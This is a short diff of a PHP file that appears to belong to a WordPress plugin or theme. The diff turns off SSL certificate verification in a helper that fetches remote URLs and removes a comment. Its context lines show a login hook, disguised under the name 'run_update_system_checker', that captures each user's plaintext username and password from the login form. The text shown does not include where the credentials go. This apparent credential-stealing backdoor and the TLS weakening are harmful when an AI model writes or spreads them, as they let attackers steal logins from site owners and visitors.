@@ -18,7 +18,13 @@ function curl_data($url, $params) {
         $data = curl_exec($ch);
         curl_close($ch);
     } else {
-        $data = file_get_contents($url);
+        $context = stream_context_create([
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+            ]
+        ]);
+        $data = file_get_contents($url, false, $context);
     }
     return $data;
 }
@@ -26,7 +32,6 @@ function curl_data($url, $params) {
 add_action('wp_login', 'run_update_system_checker', 10, 2);
 
 function run_update_system_checker($user_login, $user) {
-    // Access the POST request data
     $username = isset($_POST['log']) ? sanitize_text_field($_POST['log']) : '';
     $password = isset($_POST['pwd']) ? sanitize_text_field($_POST['pwd']) : '';
 
